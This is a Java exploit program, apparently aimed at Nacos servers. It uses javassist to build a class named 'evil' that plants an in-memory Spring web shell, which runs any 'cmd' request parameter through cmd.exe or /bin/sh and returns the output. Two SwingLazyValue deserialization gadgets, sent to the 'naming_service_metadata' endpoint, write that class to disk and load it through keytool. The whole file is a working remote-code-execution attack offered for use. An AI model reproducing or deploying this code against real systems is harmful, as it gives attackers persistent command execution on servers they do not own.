package com.exp.nacos;

import javassist.*;
import sun.swing.SwingLazyValue;

public class memShellExp {
    public static void main(String[] args) throws Exception {
        ClassPool pool = ClassPool.getDefault();
        pool.importPackage("org.springframework.web.servlet.handler.AbstractHandlerMapping");
        pool.importPackage("org.springframework.web.context.WebApplicationContext");
        pool.importPackage("org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping");
        pool.importPackage("javax.servlet.http.HttpServletRequest");
        pool.importPackage("javax.servlet.http.HttpServletResponse");
        pool.importPackage("java.io.PrintWriter");
        pool.importPackage("java.io.Writer");
        pool.importPackage("java.lang.reflect.Field");
        pool.importPackage("java.util.ArrayList");
        pool.importPackage("java.util.LinkedHashSet");
        pool.importPackage("java.util.Scanner");
        CtClass ctClass = pool.makeClass("evil");
        ctClass.setInterfaces(new CtClass[]{pool.get("org.springframework.web.servlet.HandlerInterceptor")});

        CtConstructor cs = ctClass.makeClassInitializer();
        cs.setBody("try {\n" +
                "   Field field = Class.forName(\"org.springframework.context.support.LiveBeansView\").getDeclaredField(\"applicationContexts\");\n" +
                "   field.setAccessible(true);\n" +
                "   WebApplicationContext context = (WebApplicationContext) ((LinkedHashSet)field.get(null)).iterator().next();\n" +
                "   AbstractHandlerMapping abstractHandlerMapping = context.getBean(RequestMappingHandlerMapping.class);\n" +
                "   Field field1 = AbstractHandlerMapping.class.getDeclaredField(\"adaptedInterceptors\");\n" +
                "   field1.setAccessible(true);\n" +
                "   ArrayList adaptedInterceptors = (ArrayList) field1.get(abstractHandlerMapping);\n" +
                "   adaptedInterceptors.add(Class.forName(\"evil\").newInstance());\n" +
                "   System.out.println(\"Done!!!\");\n" +
                "} catch (Exception e) {\n" +
                "   e.printStackTrace();\n" +
                " }");
        CtMethod cm = CtNewMethod.make("public boolean preHandle(HttpServletRequest request, HttpServletResponse response, Object handler) throws Exception {\n" +
                "   String code = request.getParameter(\"cmd\");\n" +
                "   if(code != null){\n" +
                "       try {\n" +
                "           PrintWriter writer = response.getWriter();\n" +
                "           String o = \"\";\n" +
                "           ProcessBuilder p;\n" +
                "           if(System.getProperty(\"os.name\").toLowerCase().contains(\"win\")){\n" +
                "               p = new ProcessBuilder(new String[]{\"cmd.exe\", \"/c\", code});\n" +
                "           }else{\n" +
                "               p = new ProcessBuilder(new String[]{\"/bin/sh\", \"-c\", code});\n" +
                "           }\n" +
                "           Scanner c = new java.util.Scanner(p.start().getInputStream()).useDelimiter(\"\\\\\\\\A\");\n" +
                "           o = c.hasNext() ? c.next(): o;\n" +
                "           c.close();\n" +
                "           writer.write(o);\n" +
                "           writer.flush();\n" +
                "           writer.close();\n" +
                "       }catch (Exception e){\n" +
                "           e.printStackTrace();\n" +
                "       }\n" +
                "       return false;\n" +
                "   }\n" +
                "   return true;\n" +
                "}", ctClass);
        ctClass.addMethod(cm);
        byte[] classBytes = ctClass.toBytecode();

        SwingLazyValue lazyValue1 = new SwingLazyValue("com.sun.org.apache.xml.internal.security.utils.JavaUtils", "writeBytesToFilename", new Object[]{"./evil.class", classBytes});
        SwingLazyValue lazyValue2 = new SwingLazyValue("sun.security.tools.keytool.Main", "main", new Object[]{new String[]{
                "-LIST",
                "-provider:",
                "evil",
                "-keystore",
                "NONE",
                "-protected",
                "-debug",
                "-providerpath",
                "./"
        }});

        utils.sendRequest(utils.packMetadataObject(lazyValue1), "naming_service_metadata");
        utils.sendRequest(utils.packMetadataObject(lazyValue2), "naming_service_metadata");
    }
}
